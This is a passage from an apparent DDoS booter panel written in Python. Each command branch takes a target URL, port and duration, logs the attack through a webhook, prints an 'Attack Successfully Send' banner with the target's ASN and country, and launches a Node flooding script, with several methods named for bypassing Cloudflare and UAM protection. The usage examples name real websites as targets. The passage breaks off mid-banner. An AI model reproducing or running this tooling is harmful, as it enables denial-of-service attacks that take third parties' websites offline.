                  \x1b[38;2;255;0;255m╔\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╗\x1b[38;2;225;30;255m╔╦\x1b[38;2;219;36;255m╗\x1b[38;2;213;42;255m╔\x1b[38;2;207;48;255m╦╗\x1b[38;2;201;54;255m╔═\x1b[38;2;195;60;255m╗\x1b[38;2;189;66;255m╔═\x1b[38;2;183;72;255m╗\x1b[38;2;177;78;255m╦\x1b[38;2;171;84;255m╔\x1b[38;2;165;90;255m═  \x1b[38;2;159;96;255m╔\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╗\x1b[38;2;141;114;255m╔\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m╗\x1b[38;2;123;132;255m╔\x1b[38;2;117;138;255m╗\x1b[38;2;111;144;255m╔\x1b[38;2;87;168;255m╔\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╗
                  \x1b[38;2;255;0;255m╠\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╣ \x1b[38;2;225;30;255m║  \x1b[38;2;219;36;255m║ \x1b[38;2;213;42;255m╠═\x1b[38;2;207;48;255m╣\x1b[38;2;201;54;255m║  \x1b[38;2;195;60;255m╠\x1b[38;2;189;66;255m╩\x1b[38;2;183;72;255m╗ \x1b[38;2;177;78;255m ╚\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m╗\x1b[38;2;159;96;255m║\x1b[38;2;153;102;255m╣\x1b[38;2;147;108;255m ║\x1b[38;2;141;114;255m║\x1b[38;2;135;120;255m║\x1b[38;2;75;180;255m ║\x1b[38;2;75;180;255m║
                  \x1b[38;2;255;0;255m╩ \x1b[38;2;237;18;255m╩ \x1b[38;2;231;24;255m╩ \x1b[38;2;225;30;255m ╩ \x1b[38;2;219;36;255m╩ \x1b[38;2;213;42;255m╩\x1b[38;2;207;48;255m╚═\x1b[38;2;201;54;255m╝\x1b[38;2;195;60;255m╩ \x1b[38;2;189;66;255m╩  \x1b[38;2;183;72;255m╚\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m╝\x1b[38;2;165;90;255m╚\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m╝\x1b[38;2;147;108;255m╝\x1b[38;2;141;114;255m╚\x1b[38;2;135;120;255m╝\x1b[38;2;87;168;255m═\x1b[38;2;75;180;255m╩\x1b[38;2;75;180;255m╝
                \x1b[38;2;243;12;255m╚╦\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╝
           \x1b[38;2;243;12;255m╔═════╩\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╩═\x1b[38;2;75;180;255m════╗
                   👾 \x1b[38;2;0;255;255m𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾
                   
                   \x1b[38;2;255;255;255mTARGET   : [{url}]
                   PORT     : [{port}]
                   DURATION : [{time}]
                   METHOD   : [touch-gorilla]
                   SENT BY  : [{uname}]
                   COOLDOWN : [0]
                   CONCS    : [1]
                   VIP      : [\x1b[38;2;0;212;14mTrue\x1b[38;2;255;255;255m]
           \x1b[38;2;243;12;255m╚══════\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m══\x1b[38;2;75;180;255m════╝\x1b[0m
                   
""")
                os.system(f"node ./data/touch.js {url} {time} proxy")
            except IndexError:
                print("Usage : touch-gorilla <url> <port> <time>")
                print("Example : touch-gorilla https://github.com/ 443 60")
        elif "http-browser" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                asn, org, country, path = get_info_from_url(url)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(username, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;255;105;180m                           ╔╦╗╔═╗╔╗╔╦╔═╔═╗╦ ╦
\033[38;2;255;105;180m                           ║║║║ ║║║║╠╩╗║╣ ╚╦╝
\033[38;2;255;105;180m                           ╩ ╩╚═╝╝╚╝╩ ╩╚═╝ ╩ 
\033[38;2;255;165;0m                \033[33m⚡\033[1;37m 𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇 \033[38;2;0;255;255m𝓣𝓮𝓼𝓽 \033[1;37m𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇, 𝒢𝓊𝒶𝓁𝒾𝓉𝓎 𝓐𝒩𝒟 𝒮𝑒𝒸𝓊𝓇𝒾𝓉𝓎 \033[33m⚡\033[1;37m
\033[38;2;255;182;193m               ╔═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;0;255;255m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mMETHOD: \033[90m[\033[37m[http-browser]\033[90m]
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;255;140;0m               ║   \033[37mASN: \033[90m[\033[37m{asn}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mORG: \033[90m[\033[37m{org}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mCOUNTRY: \033[90m[\033[37m{country}]\033[90m
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
""")
                os.system(f"node ./data/browser.js {url} {time}")
            except IndexError:
                print("Usage : http-browser <url> <port> <time>")
                print("Example : http-browser https://github.com/ 443 120")
        elif "http-xv" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                asn, org, country, path = get_info_from_url(url)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(username, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;255;105;180m                           ╔╦╗╔═╗╔╗╔╦╔═╔═╗╦ ╦
\033[38;2;255;105;180m                           ║║║║ ║║║║╠╩╗║╣ ╚╦╝
\033[38;2;255;105;180m                           ╩ ╩╚═╝╝╚╝╩ ╩╚═╝ ╩ 
\033[38;2;255;165;0m                \033[33m⚡\033[1;37m 𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇 \033[38;2;0;255;255m𝓣𝓮𝓼𝓽 \033[1;37m𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇, 𝒢𝓊𝒶𝓁𝒾𝓉𝓎 𝓐𝒩𝒟 𝒮𝑒𝒸𝓊𝓇𝒾𝓉𝓎 \033[33m⚡\033[1;37m
\033[38;2;255;182;193m               ╔═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;0;255;255m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mMETHOD: \033[90m[\033[37m[http-xv]\033[90m]
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;255;140;0m               ║   \033[37mASN: \033[90m[\033[37m{asn}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mORG: \033[90m[\033[37m{org}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mCOUNTRY: \033[90m[\033[37m{country}]\033[90m
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
""")
                os.system(f"node ./data/xv.js {url} {time}")
            except IndexError:
                print("Usage : http-xv <url> <port> <time>")
                print("Example : http-xv https://github.com/ 443 120")
        elif "uam" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                th=cnc.split()[3]
                time=cnc.split()[4]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(username, url, port, time)
                print(f"""
                  \x1b[38;2;255;0;255m╔\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╗\x1b[38;2;225;30;255m╔╦\x1b[38;2;219;36;255m╗\x1b[38;2;213;42;255m╔\x1b[38;2;207;48;255m╦╗\x1b[38;2;201;54;255m╔═\x1b[38;2;195;60;255m╗\x1b[38;2;189;66;255m╔═\x1b[38;2;183;72;255m╗\x1b[38;2;177;78;255m╦\x1b[38;2;171;84;255m╔\x1b[38;2;165;90;255m═  \x1b[38;2;159;96;255m╔\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╗\x1b[38;2;141;114;255m╔\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m╗\x1b[38;2;123;132;255m╔\x1b[38;2;117;138;255m╗\x1b[38;2;111;144;255m╔\x1b[38;2;87;168;255m╔\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╗
                  \x1b[38;2;255;0;255m╠\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╣ \x1b[38;2;225;30;255m║  \x1b[38;2;219;36;255m║ \x1b[38;2;213;42;255m╠═\x1b[38;2;207;48;255m╣\x1b[38;2;201;54;255m║  \x1b[38;2;195;60;255m╠\x1b[38;2;189;66;255m╩\x1b[38;2;183;72;255m╗ \x1b[38;2;177;78;255m ╚\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m╗\x1b[38;2;159;96;255m║\x1b[38;2;153;102;255m╣\x1b[38;2;147;108;255m ║\x1b[38;2;141;114;255m║\x1b[38;2;135;120;255m║\x1b[38;2;75;180;255m ║\x1b[38;2;75;180;255m║
                  \x1b[38;2;255;0;255m╩ \x1b[38;2;237;18;255m╩ \x1b[38;2;231;24;255m╩ \x1b[38;2;225;30;255m ╩ \x1b[38;2;219;36;255m╩ \x1b[38;2;213;42;255m╩\x1b[38;2;207;48;255m╚═\x1b[38;2;201;54;255m╝\x1b[38;2;195;60;255m╩ \x1b[38;2;189;66;255m╩  \x1b[38;2;183;72;255m╚\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m╝\x1b[38;2;165;90;255m╚\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m╝\x1b[38;2;147;108;255m╝\x1b[38;2;141;114;255m╚\x1b[38;2;135;120;255m╝\x1b[38;2;87;168;255m═\x1b[38;2;75;180;255m╩\x1b[38;2;75;180;255m╝
                \x1b[38;2;243;12;255m╚╦\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╝
           \x1b[38;2;243;12;255m╔═════╩\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╩═\x1b[38;2;75;180;255m════╗
                   👾 \x1b[38;2;0;255;255m𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾
                   
                   \x1b[38;2;255;255;255mTARGET   : [{url}]
                   PORT     : [{port}]
                   DURATION : [{time}]
                   METHOD   : [uam]
                   SENT BY  : [{uname}]
                   COOLDOWN : [0]
                   CONCS    : [1]
                   VIP      : [\x1b[38;2;0;212;14mTrue\x1b[38;2;255;255;255m]
           \x1b[38;2;243;12;255m╚══════\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m══\x1b[38;2;75;180;255m════╝\x1b[0m
                   
""")
                os.system(f"node ./data/ll.js {url} {th} {time} proxy.txt")
            except IndexError:
                print("Usage : uam <url> <port> <thread> <time>")
                print("Example : uam https://lequocviet.tk 443 10 1000")
        elif "httpsbypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                asn, org, country, path = get_info_from_url(url)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(username, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;255;105;180m                           ╔╦╗╔═╗╔╗╔╦╔═╔═╗╦ ╦
\033[38;2;255;105;180m                           ║║║║ ║║║║╠╩╗║╣ ╚╦╝
\033[38;2;255;105;180m                           ╩ ╩╚═╝╝╚╝╩ ╩╚═╝ ╩ 
\033[38;2;255;165;0m                \033[33m⚡\033[1;37m 𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇 \033[38;2;0;255;255m𝓣𝓮𝓼𝓽 \033[1;37m𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇, 𝒢𝓊𝒶𝓁𝒾𝓉𝓎 𝓐𝒩𝒟 𝒮𝑒𝒸𝓊𝓇𝒾𝓉𝓎 \033[33m⚡\033[1;37m
\033[38;2;255;182;193m               ╔═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;0;255;255m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mMETHOD: \033[90m[\033[37m[httpsbypass]\033[90m]
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;255;140;0m               ║   \033[37mASN: \033[90m[\033[37m{asn}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mORG: \033[90m[\033[37m{org}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mCOUNTRY: \033[90m[\033[37m{country}]\033[90m
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
""")
                os.system(f"node ./data/httpbypassv2.js {url} {time}")
            except IndexError:
                print("Usage : httpsbypass <url> <port> <time>")
                print("Example : httpsbypass https://lequocviet.tk 443 60")
        elif "https-basic" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                asn, org, country, path = get_info_from_url(url)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(username, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;255;105;180m                           ╔╦╗╔═╗╔╗╔╦╔═╔═╗╦ ╦
\033[38;2;255;105;180m                           ║║║║ ║║║║╠╩╗║╣ ╚╦╝
\033[38;2;255;105;180m                           ╩ ╩╚═╝╝╚╝╩ ╩╚═╝ ╩ 
\033[38;2;255;165;0m                \033[33m⚡\033[1;37m 𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇 \033[38;2;0;255;255m𝓣𝓮𝓼𝓽 \033[1;37m𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇, 𝒢𝓊𝒶𝓁𝒾𝓉𝓎 𝓐𝒩𝒟 𝒮𝑒𝒸𝓊𝓇𝒾𝓉𝓎 \033[33m⚡\033[1;37m
\033[38;2;255;182;193m               ╔═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;0;255;255m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mMETHOD: \033[90m[\033[37m[https-basic]\033[90m]
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;255;140;0m               ║   \033[37mASN: \033[90m[\033[37m{asn}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mORG: \033[90m[\033[37m{org}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mCOUNTRY: \033[90m[\033[37m{country}]\033[90m
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
""")
                os.system(f"node ./data/https.js {url} {time}")
            except IndexError:
                print("Usage : https-basic <url> <port> <time>")
                print("Example : https-basic https://panel.aerocloud.tech/ 443 60")
            
        elif "httpsv2" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                asn, org, country, path = get_info_from_url(url)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(username, url, port, time)
                print(f"""
\033[H\033[2J\r\n
\033[8;19;66t

\033[38;2;255;105;180m                           ╔╦╗╔═╗╔╗╔╦╔═╔═╗╦ ╦
\033[38;2;255;105;180m                           ║║║║ ║║║║╠╩╗║╣ ╚╦╝
\033[38;2;255;105;180m                           ╩ ╩╚═╝╝╚╝╩ ╩╚═╝ ╩ 
\033[38;2;255;165;0m                \033[33m⚡\033[1;37m 𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇 \033[38;2;0;255;255m𝓣𝓮𝓼𝓽 \033[1;37m𝒮𝓉𝒶𝓇𝒯𝒾𝑒𝓇, 𝒢𝓊𝒶𝓁𝒾𝓉𝓎 𝓐𝒩𝒟 𝒮𝑒𝒸𝓊𝓇𝒾𝓉𝓎 \033[33m⚡\033[1;37m
\033[38;2;255;182;193m               ╔═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;0;255;255m               ║   \033[37mTARGET: \033[90m[\033[37m[{url}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mPORT: \033[90m[\033[37m[{port}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mTIME: \033[90m[\033[37m[{time}]\033[90m]
\033[38;2;0;255;255m               ║   \033[37mMETHOD: \033[90m[\033[37m[httpsv2]\033[90m]
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
\033[38;2;255;140;0m               ║   \033[37mASN: \033[90m[\033[37m{asn}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mORG: \033[90m[\033[37m{org}]\033[90m
\033[38;2;255;140;0m               ║   \033[37mCOUNTRY: \033[90m[\033[37m{country}]\033[90m
\033[38;2;0;255;255m               ╠═══\033[38;2;255;123;255m════\033[38;2;255;102;204m════\033[38;2;204;85;204m════\033[38;2;153;51;255m════\033[38;2;102;102;255m════\033[38;2;51;153;255m════\033[38;2;51;204;255m════\033[38;2;0;204;255m════\033[38;2;0;255;255m═
""")
                os.system(f"node ./data/tls.js {url} {time}")
            except IndexError:
                print("Usage : httpsv2 <url> <port> <time>")
                print("Example : httpsv2 https://www.legoland.com 443 60")
        elif "cloudflare" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                th=cnc.split()[4]
                Screen.wrapper(atk)
                ##time.sleep(5)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
                  \x1b[38;2;255;0;255m╔\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╗\x1b[38;2;225;30;255m╔╦\x1b[38;2;219;36;255m╗\x1b[38;2;213;42;255m╔\x1b[38;2;207;48;255m╦╗\x1b[38;2;201;54;255m╔═\x1b[38;2;195;60;255m╗\x1b[38;2;189;66;255m╔═\x1b[38;2;183;72;255m╗\x1b[38;2;177;78;255m╦\x1b[38;2;171;84;255m╔\x1b[38;2;165;90;255m═  \x1b[38;2;159;96;255m╔\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╗\x1b[38;2;141;114;255m╔\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m╗\x1b[38;2;123;132;255m╔\x1b[38;2;117;138;255m╗\x1b[38;2;111;144;255m╔\x1b[38;2;87;168;255m╔\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╗
                  \x1b[38;2;255;0;255m╠\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╣ \x1b[38;2;225;30;255m║  \x1b[38;2;219;36;255m║ \x1b[38;2;213;42;255m╠═\x1b[38;2;207;48;255m╣\x1b[38;2;201;54;255m║  \x1b[38;2;195;60;255m╠\x1b[38;2;189;66;255m╩\x1b[38;2;183;72;255m╗ \x1b[38;2;177;78;255m ╚\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m╗\x1b[38;2;159;96;255m║\x1b[38;2;153;102;255m╣\x1b[38;2;147;108;255m ║\x1b[38;2;141;114;255m║\x1b[38;2;135;120;255m║\x1b[38;2;75;180;255m ║\x1b[38;2;75;180;255m║
                  \x1b[38;2;255;0;255m╩ \x1b[38;2;237;18;255m╩ \x1b[38;2;231;24;255m╩ \x1b[38;2;225;30;255m ╩ \x1b[38;2;219;36;255m╩ \x1b[38;2;213;42;255m╩\x1b[38;2;207;48;255m╚═\x1b[38;2;201;54;255m╝\x1b[38;2;195;60;255m╩ \x1b[38;2;189;66;255m╩  \x1b[38;2;183;72;255m╚\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m╝\x1b[38;2;165;90;255m╚\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m╝\x1b[38;2;147;108;255m╝\x1b[38;2;141;114;255m╚\x1b[38;2;135;120;255m╝\x1b[38;2;87;168;255m═\x1b[38;2;75;180;255m╩\x1b[38;2;75;180;255m╝
                \x1b[38;2;243;12;255m╚╦\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╝
